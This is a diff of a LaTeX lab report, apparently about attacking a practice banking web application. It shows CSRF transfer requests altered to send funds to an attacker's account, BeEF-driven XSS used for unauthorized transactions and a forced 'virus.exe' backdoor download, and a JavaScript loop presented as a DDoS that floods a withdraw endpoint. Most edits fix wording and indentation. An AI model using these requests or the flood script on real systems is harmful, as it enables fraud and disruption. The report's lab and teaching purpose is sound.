@@ -227,17 +227,17 @@ First, we need to identify the structure of the URL and continue with the CSRF e
 We intercepted a request \ref{fig:interceptedTransferData} to transfer funds within the bank application, revealing the critical parameters involved in the transaction. 
 The captured request was: 
 \begin{tiny}
-	\begin{verbatim}
-		GET /htdocs/index.php?page=htbtransfer\&srcacc=184830489\&dstbank=41131337\&dstacc=test\&amount=20000\&remark=dusan\&
-		htbtransfer=Transfer HTTP/2. 
-	\end{verbatim}
+    \begin{verbatim}
+ GET /htdocs/index.php?page=htbtransfer\&srcacc=184830489\&dstbank=41131337\&dstacc=test\&amount=20000\&remark=dusan\&
+ htbtransfer=Transfer HTTP/2. 
+    \end{verbatim}
 \end{tiny}
 
 This request includes several parameters: srcacc (source account number), dstbank (destination bank code), dstacc (destination account number), amount (transfer amount), remark (transaction remark), and htbtransfer (action to initiate the transfer). By analyzing this request, we understood the structure and flow of the transaction. We then modified the intercepted request to redirect the funds to a malicious user. Specifically, we changed the dstacc parameter to reflect the attacker's account number, for instance, dstacc=123456789. The modified request thus became: 
 \begin{tiny}
 \begin{verbatim} 
-	GET /htdocs/index.php?page=htbtransfer&srcacc=184830489&dstbank=41131337&dstacc=123456789&amount=20000&remark=dusan&
-	htbtransfer=Transfer HTTP/2. 
+ GET /htdocs/index.php?page=htbtransfer&srcacc=184830489&dstbank=41131337&dstacc=123456789&amount=20000&remark=dusan&
+ htbtransfer=Transfer HTTP/2. 
 \end{verbatim}
 \end{tiny}
 
@@ -252,8 +252,8 @@ This alteration ensures that when the request is processed by the server, the \$
 Furthermore, we modified the intercepted request to redirect the funds to a malicious user, ensuring that the dstacc parameter reflected an account number already existing in the system and adjusting the amount parameter to \$200 to comply with the user's available balance.
 \begin{tiny}
 \begin{verbatim} 
-	/htdocs/index.php?page=htbtransfer&srcacc=184830489&dstbank=41131337&dstacc=33333333&amount=200&remark=dusan&
-	htbtransfer=Transfer HTTP/2. 
+ /htdocs/index.php?page=htbtransfer&srcacc=184830489&dstbank=41131337&dstacc=33333333&amount=200&remark=dusan&
+ htbtransfer=Transfer HTTP/2. 
 \end{verbatim}
 \end{tiny}
 
@@ -286,9 +286,9 @@ The client-side JavaScript then reads data from the URL, such as parameters, fra
 For example, if a web page includes a script that reads a query parameter from the URL and directly writes it to the page without sanitization, an attacker can exploit this by creating a URL that contains a script tag. 
 When the victim loads this URL, the malicious script gets executed in their browser, allowing the attacker to perform actions like stealing cookies, session tokens, or other sensitive information, and even controlling the victim's interactions with the web application.
 
-To Achieve we have use used BeEF XSS framework \nocite{beefproject}. BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.
+To Achieve we have used the BeEF XSS framework \nocite{beefproject}. BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.
 
-Through the interface of BeeF we submit our script to target the web page. Figure \ref{fig:beefForst} shows the submitted JavaScript code in to web page.
+Through the interface of BeEF, we submit our script to target the web page. Figure \ref{fig:beefForst} shows the submitted JavaScript code in to web page.
 \begin{figure}[H]
     \centering
     \includegraphics[width=0.7\linewidth]{alisina/BeefJavaScrit1.jpeg}
@@ -304,7 +304,7 @@ After submitting the script the users will see the message the in their web page
     \label{fig:beefFirstResult}
 \end{figure}
 
-We did a DOM Request as img tag to do unathorized transactions from user session which is shown in figure \ref{fig:beefImageTransaction}.
+We did a DOM Request as an image tag to do unauthorized transactions from the user session which is shown in figure \ref{fig:beefImageTransaction}.
 \begin{figure}[H]
     \centering
     \includegraphics[width=0.7\linewidth]{alisina/beefImageTransaction.jpeg}
@@ -312,7 +312,7 @@ We did a DOM Request as img tag to do unathorized transactions from user session
     \label{fig:beefImageTransaction}
 \end{figure}
 
-We forced the user with DOM Popup to download virus.exe payload to have a backdoor attack on user's computer. Figure \ref{fig:beefPopup} shows the attack.
+We forced the user with a DOM Popup to download virus.exe payload to have a backdoor attack on the user's computer. Figure \ref{fig:beefPopup} shows the attack.
 \begin{figure}[H]
     \centering
     \includegraphics[width=0.7\linewidth]{alisina/beefpopup.jpeg}
@@ -320,37 +320,37 @@ We forced the user with DOM Popup to download virus.exe payload to have a backdo
     \label{fig:beefPopup}
 \end{figure}
 
-In addition, we can run a DDOS attack through vistim's computer with the help of XSS attack with running the following script.
+In addition, we can run a DDOS attack through the victim's computer with the help of an XSS attack by running the following script.
 \begin{verbatim}
-	var options = {
-    host: 'localhost', 
-    path: '/withdraw',
-    port: '1234', 
-    method: 'POST',
-    headers: {'Content-Type' : 'application/json'}
+ var options = {
+ host: 'localhost', 
+ path: '/withdraw',
+ port: '1234', 
+ method: 'POST',
+ headers: {'Content-Type' : 'application/json'}
 }; 
 
 function readJSONResponse(response){
-   var responseData = ''; 
-    response.on('data', function(chunk){
-        responseData += chunk;
-    }); 
-    response.on('end', function(){
-        console.log(responseData);
-    }); 
+ var responseData = ''; 
+ response.on('data', function(chunk){
+ responseData += chunk;
+ }); 
+ response.on('end', function(){
+ console.log(responseData);
+ }); 
 }
 
 for( var i = 0; i < 1000; i++) {
-    if(i % 2 != 0) {
-        var data = {
-            "amount": 0.001,
-            "id": i,
-            "token": dateToken
-        };
-        var req = http.request(options, readJSONResponse);
-        req.write(JSON.stringify(data));
-        req.end();
-    }
+ if(i % 2 != 0) {
+ var data = {
+ "amount": 0.001,
+ "id": i,
+ "token": dateToken
+ };
+ var req = http.request(options, readJSONResponse);
+ req.write(JSON.stringify(data));
+ req.end();
+ }
 }
 \end{verbatim}
 \nocite{sqlmap}
